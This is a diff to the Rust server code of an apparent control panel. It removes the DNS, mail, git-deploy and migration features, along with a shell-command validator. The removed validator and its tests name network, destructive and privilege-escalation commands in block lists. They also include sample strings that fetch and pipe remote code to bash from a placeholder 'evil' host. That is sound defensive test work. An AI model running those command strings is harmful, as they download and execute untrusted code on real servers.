@@ -12,13 +12,10 @@ pub mod branding_assets;
 pub mod dashboard;
 pub mod oauth;
 pub mod databases;
-pub mod dns;
 pub mod docker_apps;
 pub mod extensions;
 pub mod incidents;
-pub mod git_deploys;
 pub mod logs;
-pub mod mail;
 pub mod metrics;
 pub mod monitors;
 pub mod notifications;
@@ -36,7 +33,6 @@ pub mod tls_certificates;
 pub mod system;
 pub mod terminal;
 pub mod users;
-pub mod migration;
 pub mod secrets;
 pub mod iac;
 pub mod image_scans;
@@ -66,15 +62,12 @@ pub fn client_ip(headers: &HeaderMap) -> Option<String> {
         .map(|s| s.split(',').next().unwrap_or(s).trim().to_string())
 }
 
-/// Failed webhook-secret attempts tolerated per deploy id before the route
-/// starts refusing, inside the one-hour window both webhook handlers roll.
-///
-/// It lives here because it has THREE readers that must agree: the git-deploy
-/// webhook, the site-deploy webhook, and the cleanup task in `main.rs`, which
-/// sheds zero-count entries above its cap and therefore has to know what a
-/// count "at the limit" is. They disagreed once already — the janitor evicted
-/// on a five-minute window while both handlers promised an hour — and a literal
-/// repeated in three files is how that happens.
+/// The count at which the `main.rs` cleanup task sheds a webhook-secret
+/// attempt entry. The webhook handlers that once rolled the one-hour window
+/// are gone with sites/git-deploys; the janitor is the only reader left, and
+/// the constant stays so a future handler cannot disagree with it on what
+/// "at the limit" means — they disagreed once already, and the janitor
+/// evicted on a five-minute window while the handlers promised an hour.
 pub const WEBHOOK_ATTEMPT_LIMIT: u32 = 10;
 
 /// Validate a domain name format.
@@ -224,174 +217,6 @@ pub fn is_valid_container_id(id: &str) -> bool {
 }
 
 
-/// Reduce ordinary shell quoting/escaping so keyword-blocklist matching sees
-/// what the shell will actually run, not what was literally typed —
-/// `r'm' -rf /` and `w\get` contain no "rm -rf /"/"wget" substring, but the
-/// real shell this command eventually runs through (`sh -c` in
-/// `git_build.rs::run_hook` on the agent side) strips the quotes/backslashes
-/// before exec. Mirrors `dockpanel-agent`'s `command_filter::normalize_for_blocklist`,
-/// which this crate has no dependency path to reuse directly.
-fn normalize_for_blocklist(cmd: &str) -> String {
-    let mut out = String::with_capacity(cmd.len());
-    let mut chars = cmd.chars();
-    while let Some(c) = chars.next() {
-        match c {
-            '\'' | '"' => {}
-            '\\' => {
-                if let Some(next) = chars.next() {
-                    out.push(next);
-                }
-            }
-            _ => out.push(c),
-        }
-    }
-    out
-}
-
-/// Validate a shell command string for safety (used for cron, pre_build, post_deploy).
-/// Rejects dangerous shell metacharacters and patterns while allowing legitimate commands.
-pub fn is_safe_shell_command(cmd: &str) -> Result<(), &'static str> {
-    if cmd.trim().is_empty() {
-        return Err("Command cannot be empty");
-    }
-    if cmd.len() > 4096 {
-        return Err("Command too long (max 4096 chars)");
-    }
-    if cmd.contains('\0') {
-        return Err("Command must not contain null bytes");
-    }
-    if cmd.contains('\n') || cmd.contains('\r') {
-        return Err("Command must not contain newlines");
-    }
-
-    // A bare `;` always chains regardless of exit status; a bare (unpaired)
-    // `|` chains just as effectively — neither is caught by the verb-anchored
-    // patterns below (";bash", "| sh", ...), which never matched "id;whoami"
-    // or "id|whoami" (no space, no shell name). `&&`/`||` remain allowed for
-    // legitimate multi-step commands (e.g. "migrate && cache:clear"): only a
-    // run of `|` whose length isn't exactly 2 is rejected.
-    if cmd.contains(';') {
-        return Err("Command must not contain a bare ; (use && or || to chain)");
-    }
-    {
-        let bytes = cmd.as_bytes();
-        let mut i = 0;
-        while i < bytes.len() {
-            if bytes[i] == b'|' {
-                let start = i;
-                while i < bytes.len() && bytes[i] == b'|' {
-                    i += 1;
-                }
-                if i - start != 2 {
-                    return Err("Command must not contain a bare | (use || to chain)");
-                }
-            } else {
-                i += 1;
-            }
-        }
-    }
-    // A bare `&` backgrounds a command and, mid-string, acts as a chain
-    // separator exactly like `;`/`|` — "id&whoami" runs both, unpatched by
-    // either the `;` check or the `|` scan above. Only a PAIRED `&&` is the
-    // legitimate operator; scan runs of `&` the same way runs of `|` are
-    // scanned above.
-    // A bare `&` backgrounds a command and, mid-string, acts as a chain
-    // separator exactly like `;`/`|` — "id&whoami" runs both, unpatched by
-    // either the `;` check or the `|` scan above. Only a PAIRED `&&` is the
-    // legitimate operator; scan runs of `&` the same way runs of `|` are
-    // scanned above.
-    {
-        let bytes = cmd.as_bytes();
-        let mut i = 0;
-        while i < bytes.len() {
-            if bytes[i] == b'&' {
-                let start = i;
-                while i < bytes.len() && bytes[i] == b'&' {
-                    i += 1;
-                }
-                if i - start != 2 {
-                    return Err("Command must not contain a bare & (use && to chain)");
-                }
-            } else {
-                i += 1;
-            }
-        }
-    }
-
-    let lower = normalize_for_blocklist(cmd).to_lowercase();
-
-    // Block injection patterns
-    let dangerous = [
-        "`", "$(", "<(", "<<", "eval ", "exec ",
-        "|sh", "|bash", "| sh", "| bash",
-        ";sh", ";bash", "; sh", "; bash",
-        "/bin/sh", "/bin/bash",
-    ];
-    for d in &dangerous {
-        if lower.contains(d) {
-            return Err("Command contains dangerous shell injection pattern");
-        }
-    }
-
-    // Block encoding/decoding bypass tools
-    let encoding = [
-        "base64", "xxd", "openssl enc", "printf '\\x",
-    ];
-    for e in &encoding {
-        if lower.contains(e) {
-            return Err("Command contains encoding bypass tool");
-        }
-    }
-
-    // Block scripting interpreters that can execute arbitrary code
-    let interpreters = [
-        "python -c", "python2 -c", "python3 -c",
-        "perl -e", "perl -E", "ruby -e",
-        "node -e", "php -r",
-        "python -m http", "python3 -m http",
-    ];
-    for i in &interpreters {
-        if lower.contains(i) {
-            return Err("Command contains scripting interpreter with inline code");
-        }
-    }
-
-    // Block network tools
-    let network = [
-        "curl ", "wget ", "nc ", "ncat ", "socat ", "telnet ",
-    ];
-    for n in &network {
-        if lower.contains(n) {
-            return Err("Command contains network exfiltration tool");
-        }
-    }
-
-    // Block system destruction
-    let destructive = [
-        "rm -rf /", "rm -rf /*", "mkfs", "dd if=", "> /dev/",
-        "chmod 777 /", "shutdown", "reboot", "init 0", "init 6",
-    ];
-    for d in &destructive {
-        if lower.contains(d) {
-            return Err("Command contains destructive operation");
-        }
-    }
-
-    // Block privilege escalation
-    let escalation = [
-        "useradd", "userdel", "usermod", "adduser", "chpasswd",
-        "passwd", "/etc/shadow", "/etc/sudoers",
-        "visudo", "chown root", "chmod +s", "chmod 4",
-    ];
-    for e in &escalation {
-        if lower.contains(e) {
-            return Err("Command contains privilege escalation attempt");
-        }
-    }
-
-    Ok(())
-}
-
 /// Every image reference a Compose document would run, in declaration order.
 ///
 /// Read here rather than from the agent's `/apps/compose/parse` so the deploy
@@ -414,41 +239,6 @@ pub fn compose_images(yaml: &str) -> Vec<String> {
         .filter_map(|(_, svc)| svc.get("image").and_then(|v| v.as_str()))
         .map(|s| s.trim().to_string())
         .filter(|s| !s.is_empty())
-        .collect()
-}
-
-/// The services the agent will SILENTLY DROP — those naming no image.
-///
-/// The compose engine deserialises each service into a struct whose `image` is
-/// an `Option<String>` and skips the service outright when it is `None`. That
-/// service never becomes a container, so the deploy comes up missing exactly
-/// the part the author cared about while every status the panel writes says the
-/// deploy succeeded. Naming them lets a door refuse instead.
-///
-/// ⚠ The predicate has to be the AGENT'S question, not a similar one. The agent
-/// reads a typed `Option<String>`; this side reads an untyped YAML value, and
-/// the two disagree about YAML null. `image:` written with no value — the
-/// ordinary way an author blanks the line while switching a service over to
-/// `build:` — is `Some(Value::Null)` here and `None` there, so a predicate
-/// spelled `.get("image").is_none()` reports nothing while the agent drops the
-/// service. Measured over `image:`, `image: ~`, `image: ""`, `image: "   "`, a
-/// missing key and a fully-populated file; only the arm below agrees with the
-/// agent on all six.
-///
-/// The empty-string spellings are deliberately NOT included: the agent does not
-/// skip those, it tries to create a container from them, so refusing here would
-/// refuse a file the agent still deploys.
-pub fn compose_services_without_image(yaml: &str) -> Vec<String> {
-    let Ok(doc) = serde_yaml_ng::from_str::<serde_yaml_ng::Value>(yaml) else {
-        return Vec::new();
-    };
-    let Some(services) = doc.get("services").and_then(|s| s.as_mapping()) else {
-        return Vec::new();
-    };
-    services
-        .iter()
-        .filter(|(_, svc)| matches!(svc.get("image"), None | Some(serde_yaml_ng::Value::Null)))
-        .filter_map(|(name, _)| name.as_str().map(str::to_string))
         .collect()
 }
 
@@ -550,58 +340,6 @@ pub fn validate_compose_yaml(yaml: &str) -> Result<(), &'static str> {
 mod tests {
     use super::*;
 
-    // ── is_safe_shell_command (cron / pre_build_cmd / post_deploy_cmd save-time gate) ──
-
-    /// `dockpanel-fanout` s429: a bare `;`/`|` (no trailing space, no "sh"/
-    /// "bash" suffix) passed straight through the old verb-anchored dangerous
-    /// list — `is_safe_shell_command("id;whoami")` returned `Ok(())`. This is
-    /// the SAME gap as the agent-side `is_safe_cron_command` fix (both share
-    /// the identical bypass shape), on the save-time side used by cron,
-    /// pre_build_cmd, and post_deploy_cmd. `&&`/`||` must keep working.
-    #[test]
-    fn shell_command_rejects_bare_chain_operators_keeps_paired_operators() {
-        assert!(is_safe_shell_command("id;whoami").is_err());
-        assert!(is_safe_shell_command("id|whoami").is_err());
-        assert!(is_safe_shell_command("id ;whoami").is_err());
-        assert!(is_safe_shell_command("id; whoami").is_err());
-        assert!(is_safe_shell_command("legit-command;curl http://x/y|bash").is_err());
-        assert!(is_safe_shell_command("a|||b").is_err());
-        assert!(is_safe_shell_command("php artisan migrate && php artisan cache:clear").is_ok());
-        assert!(is_safe_shell_command("backup.sh || notify-fail.sh").is_ok());
-        assert!(is_safe_shell_command("npm install").is_ok());
-    }
-
-    #[test]
-    fn shell_command_rejects_bare_ampersand_keeps_paired() {
-        // The completeness-critic's executed PoC strings: `;` and `|` were fixed,
-        // `&` was not — a bare `&` chains just as effectively (background + continue).
-        assert!(is_safe_shell_command("id&whoami").is_err());
-        assert!(is_safe_shell_command("id & whoami").is_err());
-        assert!(is_safe_shell_command("echo hi & id > /tmp/pwned").is_err());
-        assert!(is_safe_shell_command("a&&&b").is_err());
-        assert!(is_safe_shell_command("backup.sh && verify.sh").is_ok());
-        assert!(is_safe_shell_command("a && b && c").is_ok());
-    }
-
-    /// `dockpanel-fanout` s454 completeness critic: this function had no
-    /// quote/backslash normalization at all, so `r'm' -rf /` and `w\get`
-    /// contain no "rm -rf /"/"wget" substring and pass every dangerous-
-    /// pattern list below — the same gap the agent-side
-    /// `command_filter::normalize_for_blocklist` was already built to close
-    /// for its own siblings. This save-time gate guards cron/pre_build_cmd/
-    /// post_deploy_cmd, whose values are eventually shell-executed.
-    #[test]
-    fn shell_command_rejects_quote_split_evasion() {
-        assert!(is_safe_shell_command("rm -rf /").is_err());
-        assert!(is_safe_shell_command("r'm' -rf /").is_err());
-        assert!(is_safe_shell_command("r\"m\" -rf /").is_err());
-        assert!(is_safe_shell_command("cu''rl http://evil|bash").is_err());
-        assert!(is_safe_shell_command("w\\get -qO- http://evil").is_err());
-        // Legitimate commands must still pass.
-        assert!(is_safe_shell_command("npm run build").is_ok());
-        assert!(is_safe_shell_command("echo 'deployed'").is_ok());
-    }
-
     // ── Compose image extraction (the deploy gate's input) ──────────────
 
     #[test]
@@ -638,59 +376,6 @@ mod tests {
         // not whether either of them implements merge keys.
         let merged = "services:\n  a: &base\n    image: redis:7\n  b:\n    <<: *base\n";
         assert_eq!(compose_images(merged).len(), 1);
-    }
-
-    // ── The services the agent silently drops ───────────────────────────
-
-    #[test]
-    fn services_without_an_image_are_named() {
-        let yaml = "services:\n  web:\n    build: .\n  db:\n    image: postgres:16\n";
-        assert_eq!(
-            compose_services_without_image(yaml),
-            vec!["web".to_string()]
-        );
-        // Nothing to refuse when every service names an image.
-        let ok = "services:\n  web:\n    image: nginx\n  db:\n    image: postgres:16\n";
-        assert!(compose_services_without_image(ok).is_empty());
-    }
-
-    #[test]
-    fn a_blanked_image_line_is_the_same_defect_and_must_be_named_too() {
-        // ⚠ This is the case that decides the predicate, and it is the one an
-        // author actually writes: `image:` left with no value while switching a
-        // service to `build:`. Here that is `Some(Value::Null)`; on the agent it
-        // deserialises to `None` and the service is dropped. A predicate spelled
-        // `.get("image").is_none()` returns nothing for all three spellings
-        // below while the agent drops the service — the refusal would be green
-        // from birth against the ordinary spelling of the thing it refuses.
-        for yaml in [
-            "services:\n  web:\n    image:\n    build: .\n  db:\n    image: postgres:16\n",
-            "services:\n  web:\n    image: ~\n  db:\n    image: postgres:16\n",
-            "services:\n  web:\n    image: null\n  db:\n    image: postgres:16\n",
-        ] {
-            assert_eq!(
-                compose_services_without_image(yaml),
-                vec!["web".to_string()],
-                "a null image must be reported: {yaml}"
-            );
-        }
-    }
-
-    #[test]
-    fn an_empty_image_string_is_not_reported_because_the_agent_does_not_drop_it() {
-        // The agent deserialises `""` to `Some("")` and tries to create a
-        // container from it, so refusing here would refuse a file the agent
-        // still deploys. The two sides have to answer the SAME question, not
-        // two similar ones.
-        for yaml in [
-            "services:\n  web:\n    image: \"\"\n  db:\n    image: postgres:16\n",
-            "services:\n  web:\n    image: \"   \"\n  db:\n    image: postgres:16\n",
-        ] {
-            assert!(
-                compose_services_without_image(yaml).is_empty(),
-                "an empty image string is not the dropped-service defect: {yaml}"
-            );
-        }
     }
 
     // ── Reserved (control-plane) domains — s241 H2/H3 ───────────────────
@@ -1025,27 +710,6 @@ pub fn router() -> Router<AppState> {
         .route("/api/apps/{container_id}/wake", post(docker_apps::wake_container))
         .route("/api/apps/{container_id}/sleep", post(docker_apps::sleep_container))
         .route("/api/apps/{container_id}/activity-ping", post(docker_apps::activity_ping))
-        // Git Deploy
-        .route("/api/git-deploys", get(git_deploys::list).post(git_deploys::create))
-        .route("/api/git-deploys/{id}", get(git_deploys::get_one).put(git_deploys::update).delete(git_deploys::remove))
-        .route("/api/git-deploys/{id}/deploy", post(git_deploys::deploy))
-        .route("/api/git-deploys/{id}/rollback/{history_id}", post(git_deploys::rollback))
-        .route("/api/git-deploys/{id}/history", get(git_deploys::history))
-        .route("/api/git-deploys/{id}/history/{history_id}/explain", post(git_deploys::explain_history))
-        .route("/api/git-deploys/{id}/keygen", post(git_deploys::keygen))
-        .route("/api/git-deploys/{id}/stop", post(git_deploys::stop))
-        .route("/api/git-deploys/{id}/start", post(git_deploys::start))
-        .route("/api/git-deploys/{id}/restart", post(git_deploys::restart))
-        .route("/api/git-deploys/{id}/logs", get(git_deploys::container_logs))
-        .route("/api/git-deploys/{id}/previews", get(git_deploys::list_previews))
-        .route("/api/git-deploys/{id}/previews/{preview_id}", delete(git_deploys::delete_preview))
-        .route("/api/git-deploys/{id}/schedule", post(git_deploys::schedule_deploy).delete(git_deploys::cancel_scheduled_deploy))
-        .route("/api/git-deploys/deploy/{deploy_id}/log", get(git_deploys::deploy_log))
-        .route("/api/webhooks/git/{id}/{secret}", post(git_deploys::webhook))
-        // Deploy Approvals
-        .route("/api/deploy-approvals", get(git_deploys::list_approvals))
-        .route("/api/deploy-approvals/{id}/approve", post(git_deploys::approve_deploy))
-        .route("/api/deploy-approvals/{id}/reject", post(git_deploys::reject_deploy))
         // Security (admin)
         .route("/api/security/overview", get(security::overview))
         .route("/api/security/firewall", get(security::firewall_status))
@@ -1137,7 +801,6 @@ pub fn router() -> Router<AppState> {
         .route("/api/settings/export", get(settings::export_config))
         .route("/api/settings/import", post(settings::import_config))
         .route("/api/settings/recording-coverage", get(settings::recording_coverage))
-        .route("/api/settings/smtp/test", post(settings::test_email))
         .route("/api/settings/test-webhook", post(settings::test_webhook))
         .route("/api/settings/health", get(settings::health))
         .route(
@@ -1145,18 +808,6 @@ pub fn router() -> Router<AppState> {
             post(settings::reencrypt_credentials),
         )
         .route("/api/settings/oauth-redirects", get(oauth::redirect_uris))
-        // DNS Management
-        .route("/api/dns/zones", get(dns::list_zones).post(dns::create_zone))
-        .route("/api/dns/zones/{id}", delete(dns::delete_zone))
-        .route("/api/dns/zones/{id}/records", get(dns::list_records).post(dns::create_record))
-        .route("/api/dns/zones/{id}/records/{record_id}", put(dns::update_record).delete(dns::delete_record))
-        .route("/api/dns/propagation", post(dns::check_propagation))
-        .route("/api/dns/health-check", post(dns::dns_health_check))
-        .route("/api/dns/zones/{id}/dnssec", get(dns::dnssec_status))
-        .route("/api/dns/zones/{id}/changelog", get(dns::dns_changelog))
-        .route("/api/dns/zones/{id}/analytics", get(dns::dns_analytics))
-        .route("/api/dns/zones/{id}/cf/settings", get(dns::cf_zone_settings).put(dns::cf_update_setting))
-        .route("/api/dns/zones/{id}/cf/cache/purge", post(dns::cf_purge_cache))
         // Uptime Monitors
         .route("/api/monitors", get(monitors::list).post(monitors::create))
         .route("/api/monitors/certificates", get(monitors::certificate_dashboard))
@@ -1356,75 +1007,21 @@ pub fn router() -> Router<AppState> {
         .route("/api/auto-updates/disable", post(system::disable_auto_updates))
         // Service installers
         .route("/api/services/install-status", get(system::install_status))
-        .route("/api/services/install/php", post(system::install_php))
         .route("/api/services/install/certbot", post(system::install_certbot))
         .route("/api/services/install/ufw", post(system::install_ufw))
         .route("/api/services/install/fail2ban", post(system::install_fail2ban))
-        .route("/api/services/install/powerdns", post(system::install_powerdns))
         .route("/api/services/install/redis", post(system::install_redis))
         .route("/api/services/install/nodejs", post(system::install_nodejs))
-        .route("/api/services/install/composer", post(system::install_composer))
         .route("/api/services/install/sshpass", post(system::install_sshpass))
-        .route("/api/services/install/waf", post(system::install_waf))
         .route("/api/services/install/cloudflared", post(system::install_cloudflared))
         .route("/api/services/install/{install_id}/log", get(system::install_log))
         // Service uninstallers
-        .route("/api/services/uninstall/php", post(system::uninstall_php))
         .route("/api/services/uninstall/certbot", post(system::uninstall_certbot))
         .route("/api/services/uninstall/ufw", post(system::uninstall_ufw))
         .route("/api/services/uninstall/fail2ban", post(system::uninstall_fail2ban))
-        .route("/api/services/uninstall/powerdns", post(system::uninstall_powerdns))
         .route("/api/services/uninstall/redis", post(system::uninstall_redis))
         .route("/api/services/uninstall/nodejs", post(system::uninstall_nodejs))
-        .route("/api/services/uninstall/composer", post(system::uninstall_composer))
-        .route("/api/services/uninstall/waf", post(system::uninstall_waf))
         .route("/api/services/uninstall/cloudflared", post(system::uninstall_cloudflared))
-        // Mail
-        .route("/api/mail/status", get(mail::mail_status))
-        .route("/api/mail/install", post(mail::mail_install))
-        .route("/api/mail/uninstall", post(mail::mail_uninstall))
-        .route("/api/mail/domains", get(mail::list_domains).post(mail::create_domain))
-        .route("/api/mail/domains/{id}", put(mail::update_domain).delete(mail::delete_domain))
-        .route("/api/mail/domains/{id}/dns", get(mail::domain_dns))
-        .route("/api/mail/domains/{id}/accounts", get(mail::list_accounts).post(mail::create_account))
-        .route("/api/mail/domains/{id}/accounts/{account_id}", put(mail::update_account).delete(mail::delete_account))
-        .route("/api/mail/domains/{id}/aliases", get(mail::list_aliases).post(mail::create_alias))
-        .route("/api/mail/domains/{id}/aliases/{alias_id}", delete(mail::delete_alias))
-        .route("/api/mail/queue", get(mail::get_queue))
-        .route("/api/mail/queue/flush", post(mail::flush_queue))
-        .route("/api/mail/queue/{queue_id}", delete(mail::delete_queued))
-        // Mail: Rspamd spam filter
-        .route("/api/mail/rspamd/install", post(mail::rspamd_install))
-        .route("/api/mail/rspamd/status", get(mail::rspamd_status))
-        .route("/api/mail/rspamd/toggle", post(mail::rspamd_toggle))
-        // Mail: Webmail (Roundcube)
-        .route("/api/mail/webmail/install", post(mail::webmail_install))
-        .route("/api/mail/webmail/status", get(mail::webmail_status))
-        .route("/api/mail/webmail/remove", post(mail::webmail_remove))
-        // Mail: SMTP Relay
-        .route("/api/mail/relay/configure", post(mail::relay_configure))
-        .route("/api/mail/relay/status", get(mail::relay_status))
-        .route("/api/mail/relay/remove", post(mail::relay_remove))
-        // Mail: DNS Verification
-        .route("/api/mail/domains/{id}/dns-check", get(mail::dns_check))
-        .route("/api/mail/domains/{id}/preflight", get(mail::preflight))
-        // Mail: Logs & Storage
-        .route("/api/mail/logs", get(mail::mail_logs))
-        .route("/api/mail/storage", get(mail::mail_storage))
-        // Mail: Blacklist/Reputation Check
-        .route("/api/mail/blacklist-check", get(mail::blacklist_check))
-        // Mail: Rate Limiting
-        .route("/api/mail/rate-limit/set", post(mail::rate_limit_set))
-        .route("/api/mail/rate-limit/status", get(mail::rate_limit_status))
-        .route("/api/mail/rate-limit/remove", post(mail::rate_limit_remove))
-        // Mail: Backup/Restore
-        .route("/api/mail/backup", post(mail::mailbox_backup))
-        .route("/api/mail/restore", post(mail::mailbox_restore))
-        .route("/api/mail/backups", get(mail::mailbox_backups))
-        .route("/api/mail/backups/delete", post(mail::mailbox_backup_delete))
-        // Mail: TLS Enforcement
-        .route("/api/mail/tls/status", get(mail::tls_status))
-        .route("/api/mail/tls/enforce", post(mail::tls_enforce))
         // Traefik Reverse Proxy
         .route("/api/traefik/install", post(system::traefik_install))
         .route("/api/traefik/uninstall", post(system::traefik_uninstall))
@@ -1447,10 +1044,4 @@ pub fn router() -> Router<AppState> {
         .route("/api/telemetry/send", post(telemetry::send_now))
         .route("/api/telemetry/update-status", get(telemetry::update_status))
         .route("/api/telemetry/check-updates", post(telemetry::check_updates))
-        // Migration Wizard
-        .route("/api/migration/analyze", post(migration::analyze))
-        .route("/api/migration", get(migration::list))
-        .route("/api/migration/{id}", get(migration::get_one).delete(migration::remove))
-        .route("/api/migration/{id}/import", post(migration::import))
-        .route("/api/migration/{id}/progress", get(migration::progress))
 }
